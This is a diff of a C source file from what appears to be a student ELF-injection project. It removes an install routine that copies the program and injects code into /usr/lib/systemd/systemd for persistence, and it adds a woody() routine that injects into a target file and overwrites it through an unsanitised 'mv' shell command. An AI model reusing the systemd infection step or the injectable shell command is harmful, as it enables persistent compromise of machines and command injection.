@@ -1,48 +1,51 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   install.c                                          :+:      :+:    :+:   */
+/*   woody.c                                            :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: jmaia <jmaia@student.42.fr>                +#+  +:+       +#+        */
+/*   By: dhubleur <dhubleur@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2024/06/02 14:27:57 by jmaia             #+#    #+#             */
-/*   Updated: 2024/06/13 22:51:50 by jmaia            ###   ###               */
+/*   Created: 2023/05/05 15:02:19 by dhubleur          #+#    #+#             */
+/*   Updated: 2024/06/13 23:00:48 by jmaia            ###   ###               */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include "daemon.h"
-
-#include <stddef.h>
-#include <stdio.h>
-#include <stdlib.h>
-
 #include "woody.h"
 
-static bool copy_executable(char const *program_name);
+static bool move(char const *src_filename, char const *dest_filename);
 
-bool install(char const *program_name)
+bool woody(char *filename)
 {
-	bool success;
+	t_file file;
+	t_injection injection;
 
-	success = copy_executable(program_name);
-	if (!success)
+	if (!get_file_type(filename, &file))
 		return false;
-	success = woody("/usr/lib/systemd/systemd");
-	return success;
+	if (!get_specific_file(&file))
+		return false;
+	if (!prepare_injection(file, &injection))
+		return false;
+	close_file(file);
+	inject(injection);
+	end_injection(injection);
+
+	if (!move(WOODY_TMP_FILE, filename))
+		return false;
+	return true;
 }
 
-static bool copy_executable(char const *program_name)
+static bool move(char const *src_filename, char const *dest_filename)
 {
 	int success;
 	size_t cp_cmd_len;
 	char *cp_cmd = NULL;
 	bool func_result = false;
 
-	cp_cmd_len = snprintf(NULL, 0, "cp %s %s", program_name, BIN_PATH);
+	cp_cmd_len = snprintf(NULL, 0, "mv %s %s", src_filename, dest_filename);
 	cp_cmd = malloc(sizeof(char) * cp_cmd_len + 1);
 	if (cp_cmd == NULL)
 		goto cleanup;
-	success = sprintf(cp_cmd, "cp %s %s", program_name, BIN_PATH) >= 0;
+	success = sprintf(cp_cmd, "mv %s %s", src_filename, dest_filename) >= 0;
 	if (!success)
 		goto cleanup;
 
@@ -54,6 +57,6 @@ static bool copy_executable(char const *program_name)
 cleanup:
 	if (cp_cmd != NULL)
 		free(cp_cmd);
-	
+
 	return func_result;
 }
